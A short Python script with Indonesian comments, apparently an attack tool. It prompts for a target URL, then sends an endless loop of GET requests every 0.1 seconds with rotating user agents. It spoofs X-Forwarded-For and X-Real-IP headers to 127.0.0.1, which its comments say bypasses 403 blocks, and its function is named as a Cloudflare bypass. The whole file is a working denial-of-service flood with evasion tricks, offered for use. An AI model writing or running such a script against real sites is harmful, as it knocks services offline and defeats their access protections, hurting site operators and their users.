import requests
import time
import random

# Daftar user agent
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    # Tambahkan user agent lainnya di sini
]

def bypass_cloudflare(target_url):
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': '127.0.0.1',  # Bypass 403 dengan X-Forwarded-For
        'X-Real-IP': '127.0.0.1'  # Bypass 403 dengan X-Real-IP
    }
    
    while True:
        try:
            response = requests.get(target_url, headers=headers)
            print(f"Request sent! Status code: {response.status_code}")
            time.sleep(0.1)  # Atur delay untuk menghindari deteksi
        except Exception as e:
            print(f"Error: {e}")

def main():
    target_url = input("Masukkan target URL: ")
    bypass_cloudflare(target_url)

if __name__ == "__main__":
    main()
